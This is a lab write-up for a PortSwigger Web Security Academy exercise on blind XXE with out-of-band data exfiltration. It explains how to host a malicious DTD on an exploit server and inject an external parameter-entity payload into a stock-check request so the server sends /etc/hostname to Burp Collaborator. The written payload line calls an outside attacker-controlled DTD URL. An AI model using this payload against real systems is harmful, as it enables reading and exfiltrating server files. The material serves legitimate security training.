## Question:

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/6bccb6ca-ce90-40df-89e7-73056421d1ee)

## Solution:

Using Burp Suite Professional, go to the Collaborator tab. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Place the Burp Collaborator payload into a malicious DTD file:

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/815558e5-2daf-44a9-88ae-5375d3e92e9d)


Click "Go to exploit server" and save the malicious DTD file on your server. Click "View exploit" and take a note of the URL.
https://exploit-0a59002a04195a5686f356d401960080.exploit-server.net/exploit

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/2f1b91d4-1104-4902-9ecd-3b639733e46d)

You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/a6d08034-848b-4dda-8aa1-262cd3d9e072)

Insert the following external entity definition in between the XML declaration and the stockCheck element:

`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/242033bc-1264-4e61-82af-d8667e3ade3f)

You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The HTTP interaction could contain the contents of the /etc/hostname file.

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/ea59525a-3f96-4216-97af-731396005423)

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/7c271f7e-981d-41a9-8014-042775a802e1)

Lab Solved

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/78f2d505-d7e1-42c6-82f0-e0b62beadcc8)


